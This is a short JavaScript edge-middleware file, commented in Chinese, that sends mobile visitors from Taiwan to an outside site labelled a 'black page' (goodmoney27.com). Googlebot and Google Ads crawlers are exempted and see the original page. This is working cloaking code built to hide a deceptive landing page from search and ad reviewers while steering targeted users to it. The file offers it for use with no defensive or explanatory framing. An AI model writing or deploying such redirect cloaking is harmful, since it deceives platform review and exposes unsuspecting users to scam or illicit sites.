export default function middleware(request) {
  const userAgent = request.headers.get('user-agent') || '';
  const country = request.headers.get('x-vercel-ip-country') || '';
  
  // 判斷是否為行動裝置
  const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(userAgent);

  // 判斷是否為 Google 機器人
  const isGoogleBot = /Googlebot|AdsBot-Google|Google-Ads|Mediapartners-Google/i.test(userAgent);

  // 目標黑頁
  const targetBlackPage = "https://goodmoney27.com/";

  // 跳轉邏輯：台灣 + 手機 + 非機器人
  if (country === 'TW' && isMobile && !isGoogleBot) {
    return Response.redirect(targetBlackPage, 302);
  }

  // 其他情況繼續顯示原始頁面
  return new Response(null, {
    headers: { 'x-middleware-next': '1' }
  });
}
